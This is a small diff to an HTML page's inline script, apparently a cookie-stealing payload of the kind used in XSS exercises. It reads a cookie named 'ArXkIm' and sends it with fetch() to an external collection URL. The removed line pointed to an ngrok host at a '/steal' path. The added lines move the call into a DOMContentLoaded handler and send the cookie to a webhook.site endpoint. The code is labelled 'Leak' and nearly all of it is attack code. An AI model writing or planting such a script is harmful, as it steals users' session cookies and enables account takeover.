@@ -7,11 +7,15 @@
     function getCookie(name) {
       return document.cookie.split('; ').find(row => row.startsWith(name + '='))?.split('=')[1];
     }
-
-    const cookie = getCookie('ArXkIm');
+	
+	addEventListener("DOMContentLoaded", (event) => {
+        const cookie = getCookie('ArXkIm');
     
-    // Leak 
-	fetch('https://c154-87-8-85-79.ngrok-free.app/steal?cookie=' + encodeURIComponent(cookie));
+		// Leak 
+		fetch('https://webhook.site/a719827b-35f0-4ad5-939d-e3a23a1eb8de?cookie=' + encodeURIComponent(cookie));
+      });
+
+    
   </script>
 </body>
 </html>
